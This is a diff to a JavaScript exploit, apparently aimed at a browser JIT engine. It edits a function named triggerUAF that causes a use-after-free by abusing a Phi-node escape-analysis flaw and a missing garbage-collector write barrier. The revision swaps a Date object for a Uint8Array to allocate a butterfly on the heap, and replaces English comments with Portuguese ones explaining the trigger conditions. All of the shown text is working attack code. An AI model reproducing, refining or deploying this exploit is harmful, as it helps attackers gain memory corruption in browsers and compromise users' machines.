@@ -181,38 +181,35 @@ const CONFIG = {
 
 // Core UAF trigger — must be JIT compiled
 function triggerUAF(flag, k, allocCount) {
-  let A = { p0: 0x41414141, p1: 1.1, p2: 2.2 };
-  uafArray[uafArrayIndex] = A;
+    let A = { p0: 0x41414141, p1: 1.1, p2: 2.2 };
+    uafArray[uafArrayIndex] = A;
 
-  let forGC = [];
-  let a = new Date(1111);
-  a[0] = 1.1; // Creates butterfly in regular heap
+    // Uint8Array em vez de Date – a propriedade '.x' força a criação de butterfly
+    let a = new Uint8Array(0);
+    a.x = 1.1;               // butterfly alocada no heap regular
 
-  for (let j = 0; j < allocCount; ++j) {
-    forGC.push(new ArrayBuffer(0x800000));
-  }
-  A.p2 = forGC;
+    let forGC = [];
+    for (let j = 0; j < allocCount; ++j) {
+        forGC.push(new ArrayBuffer(0x800000));
+    }
+    A.p2 = forGC;
 
-  let b = { p0: 0x42424242, p1: 1.1 };
+    let b = { p0: 0x42424242, p1: 1.1 };
 
-  // Phi node — DFG sees f = Phi(b, 1.1)
-  let f;
-  f = b;
-  if (flag) f = 1.1;
+    let f;
+    f = b;
+    if (flag) f = 1.1;       // flag deve ser false para o Phi pegar o objeto b
 
-  // Make Phi escape — but b NOT marked as escaped
-  A.p1 = f;
+    A.p1 = f;                // Phi escapa – DFG pode marcar b como não escapado
 
-  // Delay loop — let GC mark A and b
-  let v = 1.1;
-  for (let i = 0; i < 1e6; ++i) {
-    for (let j = 0; j < k; ++j) { v = i; v = j; }
-  }
-  b.p0 = v;
+    let v = 1.1;
+    for (let i = 0; i < 1e6; ++i) {
+        for (let j = 0; j < k; ++j) { v = i; v = j; }
+    }
+    b.p0 = v;
 
-  // THE BUG: b.p1 = a without write barrier!
-  // b is Black, a is White → GC misses a → a gets collected → UAF
-  b.p1 = a;
+    // BUG: atribuição sem write barrier (b preto, a branco)
+    b.p1 = a;
 }
 
 // Stack clearing to remove conservative GC roots
